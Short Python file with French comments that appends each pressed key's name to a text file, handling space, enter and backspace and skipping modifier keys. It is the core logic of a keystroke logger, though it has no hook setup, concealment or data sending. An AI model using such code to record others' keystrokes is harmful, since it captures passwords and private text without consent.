# Fonction création simple du fichier
def creation_fichier(nom_fichier):
    try :
        open(nom_fichier, "w")
    except Exception as e:
        print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))


def touche_fichier(file_name, event):
    try:
        # Récupère la touche pressée
        key = event.name

        # Ouvre le fichier en mode ajout
        with open(file_name, "a", encoding="utf-8") as f:
            if key == "space":
                f.write(" ")
            elif key == "enter":
                f.write("\n")
            elif key == "backspace":
                # Aller à la fin du fichier et reculer d'un caractère
                f.seek(0, 2)
                f.seek(f.tell() - 1, 0)
                # Tronquer le fichier d'un caractère
                f.truncate()
            elif key == "maj" or key == "caps lock" or key == "shift" or key == "alt gr":
                pass
            else:
                f.write(key)
                print(key)

    except AttributeError:
        # Ignore les touches non valides (comme les touches de fonction)
        pass